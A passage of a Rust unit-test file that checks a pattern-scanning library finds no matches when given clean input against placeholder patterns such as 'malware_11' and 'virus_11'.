    assert_eq!(matches.len(), 0, "Should find 0 matches for clean input 10");
}
#[test]
fn test_clean_input_11() {
    let patterns = PatternSet::builder()
        .literal("malware_11")
        .regex("virus_11")
        .build()
        .unwrap();
    let input = b"this is completely safe data with no threats 11";
    let matches = patterns.scan(input).unwrap();
    assert_eq!(matches.len(), 0, "Should find 0 matches for clean input 11");
}
